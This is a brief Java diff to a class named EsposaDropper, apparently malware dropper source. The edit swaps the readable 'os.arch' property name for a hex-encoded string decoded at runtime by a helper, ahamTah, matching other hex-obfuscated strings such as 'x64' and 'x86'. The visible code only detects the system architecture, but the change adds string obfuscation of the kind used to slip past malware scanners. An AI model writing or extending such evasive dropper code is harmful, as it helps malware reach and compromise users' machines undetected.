@@ -24,7 +24,7 @@ public class EsposaDropper {
 	 * @return String
 	 */
 	private static void setArch() {
-		if (System.getProperty("os.arch").equals(ahamTah(amd64))) {
+		if (System.getProperty(ahamTah("6f732e61726368")).equals(ahamTah(amd64))) {
 			arch = ahamTah("783634");
 		} else {
 			arch = ahamTah("783836");
